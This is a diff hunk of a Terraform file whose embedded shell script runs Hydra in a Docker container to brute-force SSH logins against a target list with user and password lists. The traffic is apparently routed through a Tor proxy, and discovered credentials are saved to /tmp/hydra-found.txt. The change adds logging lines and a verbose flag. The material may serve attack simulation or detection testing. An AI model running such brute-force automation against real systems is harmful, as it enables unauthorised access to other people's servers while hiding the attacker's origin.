@@ -91,16 +91,18 @@ locals {
                                                 sudo /bin/bash -c "docker run -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.container_name} ${var.image} hydra -V -L ${var.user_list} -P ${var.password_list} -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
                                                 sudo /bin/bash -c "docker logs ${var.container_name} >> $LOGFILE 2>&1"
                                                 sudo /bin/bash -c "docker rm ${var.container_name}"
+                                                log "Running: proxychains hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
                                                 sudo /bin/bash -c "docker run -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.container_name} ${var.image} hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
                                                 sudo /bin/bash -c "docker logs ${var.container_name} >> $LOGFILE 2>&1"
                                                 sudo /bin/bash -c "docker rm ${var.container_name}"
                                                 EOF
                                                 : <<-EOF
                                                 log "Running: hydra -V -L ${var.user_list} -P ${var.password_list} -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
-                                                sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.image} -L ${var.user_list} -P ${var.password_list} -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
+                                                sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.image} -V -L ${var.user_list} -P ${var.password_list} -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
                                                 sudo /bin/bash -c "docker logs ${var.container_name} >> $LOGFILE 2>&1"
                                                 sudo /bin/bash -c "docker rm ${var.container_name}"
-                                                sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.image} -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
+                                                log "Running: hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
+                                                sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.image} -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
                                                 sudo /bin/bash -c "docker logs ${var.container_name} >> $LOGFILE 2>&1"
                                                 sudo /bin/bash -c "docker rm ${var.container_name}"
                                                 EOF
